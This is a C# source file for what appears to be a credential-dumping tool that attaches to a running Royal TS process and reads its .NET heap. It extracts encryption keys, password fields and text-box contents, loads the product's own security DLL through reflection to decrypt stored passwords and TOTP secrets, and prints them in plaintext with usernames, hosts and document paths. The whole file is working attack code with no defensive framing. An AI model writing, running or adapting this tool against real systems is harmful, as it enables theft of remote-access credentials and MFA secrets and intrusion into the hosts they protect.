using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Diagnostics.Runtime;

class Program
{
    static Dictionary<string, string> ReadKvStore(ClrObject obj)
    {
        var kv = new Dictionary<string, string>();
        try {
            var kvStore = obj.ReadObjectField("_keyValueStore");
            if (!kvStore.IsValid || kvStore.Type == null) return kv;
            var entries = kvStore.ReadObjectField("_entries");
            if (!entries.IsValid || entries.Type == null || !entries.Type.IsArray) return kv;
            var arr = entries.AsArray();
            for (int i = 0; i < arr.Length; i++)
            {
                try {
                    var sv = arr.GetStructValue(i);
                    var ko = sv.ReadObjectField("key");
                    var vo = sv.ReadObjectField("value");
                    if (ko.IsValid && ko.AsString() != null)
                        kv[ko.AsString()!] = vo.IsValid ? (vo.AsString() ?? "") : "";
                } catch {}
            }
        } catch {}
        return kv;
    }

    static void Main(string[] args)
    {
        if (args.Length < 2) { Console.WriteLine("Usage: HeapDumper <PID> <RoyalTSInstallDir>"); return; }
        int pid = int.Parse(args[0]);
        string rtDir = args[1];

        Console.WriteLine($"[*] Attaching to PID {pid}...");
        using var target = DataTarget.AttachToProcess(pid, false);

        foreach (var clrInfo in target.ClrVersions)
        {
            Console.WriteLine($"[*] CLR {clrInfo.Version}");
            ClrRuntime runtime;
            try {
                runtime = clrInfo.CreateRuntime();
            } catch {
                // Fallback for air-gapped systems: find DAC locally instead of symbol server
                var clrPath = clrInfo.ModuleInfo.FileName;
                if (!string.IsNullOrEmpty(clrPath)) {
                    var dacPath = Path.Combine(Path.GetDirectoryName(clrPath)!, "mscordaccore.dll");
                    Console.WriteLine($"[*] Symbol server failed, using local DAC: {dacPath}");
                    runtime = clrInfo.CreateRuntime(dacPath);
                } else {
                    throw;
                }
            }
            var heap = runtime.Heap;
            Console.WriteLine($"[*] Scanning heap...");

            var allKeysets = new List<(string key1, string key2, string doc)>();
            var docPwdCandidates = new List<string> { "" };
            var credentialInfos = new List<ClrObject>();

            // Helper to extract keys from a SecurityInterface object
            void ExtractSiKeys(ClrObject si)
            {
                string k1 = "", k2 = "", doc = "";
                try { k1 = si.ReadStringField("smhos") ?? ""; } catch {}
                try { k2 = si.ReadStringField("smhot") ?? ""; } catch {}
                try { doc = si.ReadStringField("smhou") ?? ""; } catch {}

                if (string.IsNullOrEmpty(k1))
                {
                    var strFields = new List<(string name, string val)>();
                    foreach (var f in si.Type.Fields)
                    {
                        if (f.ElementType != ClrElementType.String) continue;
                        try { var v = si.ReadStringField(f.Name); if (!string.IsNullOrEmpty(v)) strFields.Add((f.Name, v)); } catch {}
                    }
                    var keys = strFields.Where(x => x.val.Length == 50).ToList();
                    var docF = strFields.FirstOrDefault(x => x.val.EndsWith(".rtsz") || x.val.EndsWith(".rtsx") || x.val == "Application");
                    if (keys.Count >= 2)
                    {
                        k1 = keys[0].val; k2 = keys[1].val; doc = docF.val ?? "";
                        Console.WriteLine($"[*] Keys by pattern: {keys[0].name}/{keys[1].name}, doc={doc}");
                    }
                }
                if (!string.IsNullOrEmpty(k1) && !allKeysets.Any(ks => ks.key1 == k1))
                    allKeysets.Add((k1, k2, doc));
            }

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn1 = obj.Type.Name ?? "";

                if (tn1.Contains("RoyalSecurityInterface"))
                {
                    ExtractSiKeys(obj);
                    continue;
                }

                if (tn1 == "RoyalDocumentLibrary.RoyalStore")
                {
                    try { var si = obj.ReadObjectField("<SecurityInterface>k__BackingField"); if (si.IsValid && si.Type != null) ExtractSiKeys(si); } catch {}
                    try { var si = obj.ReadObjectField("<SecurityInterfaceLegacy>k__BackingField"); if (si.IsValid && si.Type != null) ExtractSiKeys(si); } catch {}
                    continue;
                }

                if (tn1 == "RoyalDocumentLibrary.CredentialInfo")
                {
                    credentialInfos.Add(obj);
                    continue;
                }

                if (tn1 == "Zxcvbn.Result")
                {
                    foreach (var f in obj.Type.Fields)
                    {
                        try {
                            if (f.ElementType == ClrElementType.String)
                            {
                                var fn = (f.Name ?? "").TrimStart('_', '<').Replace(">k__BackingField", "").ToLowerInvariant();
                                if (fn.Contains("password"))
                                {
                                    var val = obj.ReadStringField(f.Name);
                                    if (!string.IsNullOrEmpty(val) && val.Length >= 1 && val.Length <= 100 && !docPwdCandidates.Contains(val))
                                        docPwdCandidates.Add(val);
                                }
                            }
                        } catch {}
                    }
                    continue;
                }
            }

            // Phase 1b: Aggressive document password hunting
            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn = obj.Type.Name ?? "";

                // Scan any object with password-related fields
                foreach (var f in obj.Type.Fields)
                {
                    if (f.ElementType != ClrElementType.String) continue;
                    var fn = (f.Name ?? "").ToLowerInvariant().Replace(">k__backingfield", "").TrimStart('_', '<');
                    if (fn.Contains("password") || fn.Contains("passphrase") || fn.Contains("docpwd") || fn.Contains("documentpw"))
                    {
                        try {
                            var val = obj.ReadStringField(f.Name);
                            if (!string.IsNullOrEmpty(val) && val.Length >= 1 && val.Length <= 100 && !docPwdCandidates.Contains(val))
                            {
                                docPwdCandidates.Add(val);
                            }
                        } catch {}
                    }
                }

                // TextBox / PasswordBox controls - read Text/Password property
                if (tn.Contains("TextBox") || tn.Contains("PasswordBox") || tn.Contains("MaskedTextBox"))
                {
                    foreach (var f in obj.Type.Fields)
                    {
                        if (f.ElementType != ClrElementType.String) continue;
                        var fn = (f.Name ?? "").ToLowerInvariant();
                        if (fn.Contains("text") || fn.Contains("password") || fn.Contains("value"))
                        {
                            try {
                                var val = obj.ReadStringField(f.Name);
                                if (!string.IsNullOrEmpty(val) && val.Length >= 1 && val.Length <= 100 && !docPwdCandidates.Contains(val))
                                    docPwdCandidates.Add(val);
                            } catch {}
                        }
                    }
                }
            }

            Console.WriteLine($"[*] Found {allKeysets.Count} SecurityInterface keyset(s)");
            foreach (var ks in allKeysets)
                Console.WriteLine($"[*]   doc={ks.doc}, key1={ks.key1.Length}c, key2={ks.key2.Length}c");

            string siKey1 = allKeysets.Count > 0 ? allKeysets[0].key1 : "";
            string siKey2 = allKeysets.Count > 0 ? allKeysets[0].key2 : "";
            string siDoc = allKeysets.Count > 0 ? allKeysets[0].doc : "";

            // CredentialInfo fallback when no keys found
            if (allKeysets.Count == 0 && credentialInfos.Count > 0)
            {
                Console.WriteLine($"[*] No encryption keys, checking {credentialInfos.Count} CredentialInfo for cleartext...");
                Console.WriteLine("\n##RESULTS_START##");
                foreach (var ci in credentialInfos)
                {
                    try {
                        string user = "", pwd = "";
                        try { user = ci.ReadStringField("<Username>k__BackingField") ?? ""; } catch {}
                        try { pwd = ci.ReadStringField("<Password>k__BackingField") ?? ""; } catch {}
                        if (!string.IsNullOrEmpty(pwd))
                            Console.WriteLine($"TYPE:CredentialInfo|NAME:|HOST:|USER:{user}|TOTP:|OTPALGO:|OTPDIGITS:|OTPPERIOD:|OTPLABEL:|PASS:{pwd}");
                    } catch {}
                }
                Console.WriteLine("##RESULTS_END##");
                return;
            }

            if (string.IsNullOrEmpty(siKey1))
            {
                Console.WriteLine("[!] No SecurityInterface keys found on heap");
                Console.WriteLine("[*] Dumping Royal/Security types on heap for diagnostics...");
                var diagTypes = new HashSet<string>();
                foreach (var obj in heap.EnumerateObjects())
                {
                    if (!obj.IsValid || obj.Type == null) continue;
                    var tn = obj.Type.Name ?? "";
                    if ((tn.Contains("Royal") || tn.Contains("Security") || tn.Contains("Credential")) && !tn.EndsWith("[]") && diagTypes.Add(tn))
                    {
                        var fields = string.Join(", ", obj.Type.Fields.Select(f => f.Name ?? "?"));
                        Console.WriteLine($"    [{tn}] fields: {fields}");
                    }
                }
                if (diagTypes.Count == 0)
                    Console.WriteLine("    (none found - is a document open?)");
                Console.WriteLine("\n##RESULTS_START##\n##RESULTS_END##");
                return;
            }
            Console.WriteLine($"[*] SecurityInterface keys extracted (key1={siKey1.Length}c, key2={siKey2.Length}c, doc={siDoc})");
            Console.WriteLine($"[*] Found {docPwdCandidates.Count} document password candidate(s)");

            // Phase 2: Collect credentials AND connections, plus document paths
            var creds = new List<(string id, string type, string name, string user, string encPwd, string encTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel, string docName)>();
            var conns = new List<(string type, string name, string host, string port, string credId, string description, string docName)>();
            var docPaths = new Dictionary<string, string>();

            foreach (var obj in heap.EnumerateObjects())
            {
                if (!obj.IsValid || obj.Type == null) continue;
                var tn = obj.Type.Name ?? "";
                if (!tn.StartsWith("RoyalDocumentLibrary.Royal")) continue;

                // Collect document file paths
                if (tn.Contains("RoyalDocument") && !tn.Contains("Connection") && !tn.Contains("Credential"))
                {
                    var dkv = ReadKvStore(obj);
                    string dName = ""; dkv.TryGetValue("Name", out dName); dName ??= "";
                    string dPath = ""; dkv.TryGetValue("FileName", out dPath); dPath ??= "";
                    if (string.IsNullOrEmpty(dPath)) { dkv.TryGetValue("FilePath", out dPath); dPath ??= ""; }
                    if (string.IsNullOrEmpty(dPath)) {
                        foreach (var f in obj.Type.Fields) {
                            if (f.ElementType != ClrElementType.String) continue;
                            var fn = (f.Name ?? "").ToLowerInvariant();
                            if (fn.Contains("filename") || fn.Contains("filepath")) {
                                try { var v = obj.ReadStringField(f.Name); if (!string.IsNullOrEmpty(v) && v.Contains("\\")) { dPath = v; break; } } catch {}
                            }
                        }
                    }
                    if (!string.IsNullOrEmpty(dName) && !string.IsNullOrEmpty(dPath) && dPath.EndsWith(".rtsz", StringComparison.OrdinalIgnoreCase) && !docPaths.ContainsKey(dName))
                        docPaths[dName] = dPath;
                    continue;
                }

                if (tn.EndsWith("[]")) continue;
                var kv = ReadKvStore(obj);
                string name = ""; kv.TryGetValue("Name", out name); name ??= "";

                string docName = "";
                try {
                    var doc = obj.ReadObjectField("_royalDocument");
                    if (doc.IsValid && doc.Type != null) {
                        var dkv = ReadKvStore(doc);
                        dkv.TryGetValue("Name", out docName); docName ??= "";
                    }
                } catch {}

                // Credentials: have Password
                if (tn.Contains("Credential"))
                {
                    string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
                    if (string.IsNullOrEmpty(encPwd)) continue;
                    string user = ""; kv.TryGetValue("UserName", out user); user ??= "";
                    if (string.IsNullOrEmpty(user)) { kv.TryGetValue("CredentialUsername", out user); user ??= ""; }
                    string id = ""; kv.TryGetValue("ID", out id); id ??= "";
                    if (string.IsNullOrEmpty(id)) { kv.TryGetValue("Id", out id); id ??= ""; }

                    string encTotp = ""; kv.TryGetValue("MfaTotpSecret", out encTotp); encTotp ??= "";
                    string mfaCfg = ""; kv.TryGetValue("MfaConfiguration", out mfaCfg); mfaCfg ??= "0";
                    string otpAlgo = "", otpDigits = "", otpPeriod = "", otpLabel = "";
                    if (mfaCfg != "0" && mfaCfg != "") {
                        string raw = ""; kv.TryGetValue("MfaTotpGeneratorAlgorithm", out raw); raw ??= "0";
                        otpAlgo = raw switch { "0" => "SHA1", "1" => "SHA256", "2" => "SHA512", _ => raw };
                        kv.TryGetValue("MfaTotpGeneratorCodeLength", out otpDigits); otpDigits ??= "0";
                        if (otpDigits == "0") otpDigits = "6";
                        kv.TryGetValue("MfaTotpGeneratorSecondsValid", out otpPeriod); otpPeriod ??= "30";
                        kv.TryGetValue("MfaTotpGeneratorLabel", out otpLabel); otpLabel ??= "";
                    }

                    creds.Add((id, tn.Replace("RoyalDocumentLibrary.", ""), name, user, encPwd, encTotp, otpAlgo, otpDigits, otpPeriod, otpLabel, docName));
                    continue;
                }

                // Connections: have Host, may reference a credential via CredentialId
                if (tn.Contains("Connection"))
                {
                    string host = ""; kv.TryGetValue("ComputerName", out host); host ??= "";
                    if (string.IsNullOrEmpty(host)) { kv.TryGetValue("URI", out host); host ??= ""; }
                    if (string.IsNullOrEmpty(host)) { kv.TryGetValue("HostName", out host); host ??= ""; }
                    string port = ""; kv.TryGetValue("Port", out port); port ??= "";
                    if (port == "0") port = "";
                    string credId = ""; kv.TryGetValue("CredentialId", out credId); credId ??= "";
                    if (string.IsNullOrEmpty(credId)) { kv.TryGetValue("CredentialID", out credId); credId ??= ""; }
                    string desc = ""; kv.TryGetValue("Description", out desc); desc ??= "";
                    // Also check if connection has inline password
                    string encPwd = ""; kv.TryGetValue("Password", out encPwd); encPwd ??= "";
                    string user = ""; kv.TryGetValue("UserName", out user); user ??= "";
                    if (!string.IsNullOrEmpty(encPwd))
                        creds.Add(("", tn.Replace("RoyalDocumentLibrary.", ""), name, user, encPwd, "", "", "", "", "", docName));
                    if (!string.IsNullOrEmpty(host) || !string.IsNullOrEmpty(credId))
                        conns.Add((tn.Replace("RoyalDocumentLibrary.", ""), name, host, port, credId, desc, docName));
                    continue;
                }
            }

            if (docPaths.Count > 0) {
                Console.WriteLine("[*] Document paths:");
                foreach (var dp in docPaths) Console.WriteLine($"[*]   {dp.Key} => {dp.Value}");
            }

            var uniqueCreds = creds.GroupBy(e => $"{e.name}|{e.user}").Select(g => g.First()).ToList();
            var uniqueConns = conns.GroupBy(e => $"{e.name}|{e.host}").Select(g => g.First()).ToList();
            Console.WriteLine($"[*] Found {uniqueCreds.Count} credential(s), {uniqueConns.Count} connection(s)");

            AppDomain.CurrentDomain.AssemblyResolve += (s, e) => {
                var p = Path.Combine(rtDir, new AssemblyName(e.Name).Name + ".dll");
                return File.Exists(p) ? Assembly.LoadFrom(p) : null;
            };

            object? siInst = null;
            MethodInfo? decMethod = null;
            FieldInfo? fKey1 = null, fKey2 = null, fDoc = null;
            try {
                var siAsm = Assembly.LoadFrom(Path.Combine(rtDir, "RoyalDocument.SecurityInterface.dll"));
                var siType = siAsm.GetType("RoyalDocumentLibrary.RoyalSecurityInterface")!;
                siInst = Activator.CreateInstance(siType);
                var bf = BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance;

                fKey1 = siType.GetField("smhos", bf);
                fKey2 = siType.GetField("smhot", bf);
                fDoc = siType.GetField("smhou", bf);

                // Fallback: find string fields by pattern (obfuscated names in V6)
                if (fKey1 == null || fKey2 == null)
                {
                    var strFields = siType.GetFields(bf).Where(f => f.FieldType == typeof(string)).ToList();
                    Console.WriteLine($"[*] DLL string fields: {string.Join(", ", strFields.Select(f => f.Name))}");
                    // Set all string fields to empty first, then fill key1/key2/doc
                    // Key fields are the first two string fields, doc is the third
                    if (strFields.Count >= 3)
                    {
                        fKey1 = strFields[0];
                        fKey2 = strFields[1];
                        fDoc = strFields[2];
                        Console.WriteLine($"[*] Using DLL fields: key1={fKey1.Name}, key2={fKey2.Name}, doc={fDoc.Name}");
                    }
                }

                fKey1?.SetValue(siInst, siKey1);
                fKey2?.SetValue(siInst, siKey2);
                fDoc?.SetValue(siInst, siDoc);

                decMethod = siType.GetMethod("Decrypt", new[] { typeof(string), typeof(bool), typeof(string) });
                // Fallback: find any method with matching signature
                if (decMethod == null)
                {
                    foreach (var m in siType.GetMethods(bf))
                    {
                        var pars = m.GetParameters();
                        if (pars.Length == 3 && pars[0].ParameterType == typeof(string) && pars[1].ParameterType == typeof(bool) && pars[2].ParameterType == typeof(string) && m.ReturnType == typeof(string))
                        {
                            decMethod = m;
                            Console.WriteLine($"[*] Decrypt method found as: {m.Name}");
                            break;
                        }
                    }
                }
                Console.WriteLine("[*] SecurityInterface loaded, decrypting...");
            } catch (Exception ex) {
                Console.WriteLine($"[!] Failed to load SecurityInterface: {ex.Message}");
            }

            foreach (var x in uniqueCreds) {
                if (!string.IsNullOrEmpty(x.name) && !docPwdCandidates.Contains(x.name)) docPwdCandidates.Add(x.name);
                if (!string.IsNullOrEmpty(x.user) && !docPwdCandidates.Contains(x.user)) docPwdCandidates.Add(x.user);
                if (!string.IsNullOrEmpty(x.docName) && !docPwdCandidates.Contains(x.docName)) docPwdCandidates.Add(x.docName);
            }

            Console.WriteLine($"[*] Document password candidates: {docPwdCandidates.Count} (including empty)");

            // Build credential ID -> credential lookup for connection linking
            var credById = new Dictionary<string, (string name, string user, string plainPwd, string plainTotp, string otpAlgo, string otpDigits, string otpPeriod, string otpLabel)>();

            Console.WriteLine("\n##RESULTS_START##");
            int decrypted = 0;

            // Decrypt credentials
            foreach (var e in uniqueCreds)
            {
                string plainPwd = "", plainTotp = "", usedDp = "";

                foreach (var ks in allKeysets)
                {
                    if (!string.IsNullOrEmpty(plainPwd)) break;
                    if (siInst != null && fKey1 != null && fKey2 != null && fDoc != null)
                    {
                        fKey1.SetValue(siInst, ks.key1);
                        fKey2.SetValue(siInst, ks.key2);
                        fDoc.SetValue(siInst, ks.doc);
                    }
                    if (decMethod != null && siInst != null)
                    {
                        foreach (var dp in docPwdCandidates)
                        {
                            try {
                                plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, dp }) ?? "");
                                if (!string.IsNullOrEmpty(plainPwd)) { usedDp = dp; break; }
                            } catch {}
                        }
                    }
                }

                if (!string.IsNullOrEmpty(plainPwd))
                {
                    decrypted++;
                    if (!string.IsNullOrEmpty(e.encTotp) && decMethod != null && siInst != null)
                    {
                        try { plainTotp = (string)(decMethod.Invoke(siInst, new object[] { e.encTotp, false, usedDp }) ?? ""); } catch {}
                    }
                }

                // Store for connection linking
                if (!string.IsNullOrEmpty(e.id))
                    credById[e.id] = (e.name, e.user, plainPwd, plainTotp, e.otpAlgo, e.otpDigits, e.otpPeriod, e.otpLabel);

                // Find connections that reference this credential
                string linkedHosts = "";
                foreach (var c in uniqueConns.Where(c => !string.IsNullOrEmpty(c.credId) && c.credId == e.id))
                {
                    var h = c.host;
                    if (!string.IsNullOrEmpty(c.port)) h += ":" + c.port;
                    linkedHosts += (linkedHosts == "" ? "" : ", ") + h;
                }

                Console.WriteLine($"TYPE:{e.type}|NAME:{e.name}|HOST:{linkedHosts}|USER:{e.user}|TOTP:{plainTotp}|OTPALGO:{e.otpAlgo}|OTPDIGITS:{e.otpDigits}|OTPPERIOD:{e.otpPeriod}|OTPLABEL:{e.otpLabel}|PASS:{plainPwd}");
            }

            // Output connections (with linked credential info or standalone)
            foreach (var c in uniqueConns)
            {
                var hostStr = c.host;
                if (!string.IsNullOrEmpty(c.port)) hostStr += ":" + c.port;

                if (!string.IsNullOrEmpty(c.credId) && credById.TryGetValue(c.credId, out var cred))
                {
                    // Already output with the credential above, skip to avoid duplicates
                    continue;
                }
                // Connection with no linked credential - output host info
                Console.WriteLine($"TYPE:{c.type}|NAME:{c.name}|HOST:{hostStr}|USER:|TOTP:|OTPALGO:|OTPDIGITS:|OTPPERIOD:|OTPLABEL:|PASS:|DESC:{c.description}");
            }

            // CredentialInfo fallback
            if (decrypted == 0 && credentialInfos.Count > 0)
            {
                Console.WriteLine($"## CREDINFO ({credentialInfos.Count} resolved) ##");
                foreach (var ci in credentialInfos)
                {
                    try {
                        string user = "", pwd = "";
                        try { user = ci.ReadStringField("<Username>k__BackingField") ?? ""; } catch {}
                        try { pwd = ci.ReadStringField("<Password>k__BackingField") ?? ""; } catch {}
                        if (!string.IsNullOrEmpty(user) || !string.IsNullOrEmpty(pwd))
                            Console.WriteLine($"TYPE:CredentialInfo|NAME:|HOST:|USER:{user}|TOTP:|OTPALGO:|OTPDIGITS:|OTPPERIOD:|OTPLABEL:|PASS:{pwd}");
                    } catch {}
                }
            }

            // Output document paths
            foreach (var dp in docPaths)
                Console.WriteLine($"DOCPATH:{dp.Key}={dp.Value}");

            Console.WriteLine("##RESULTS_END##");
        }
    }
}
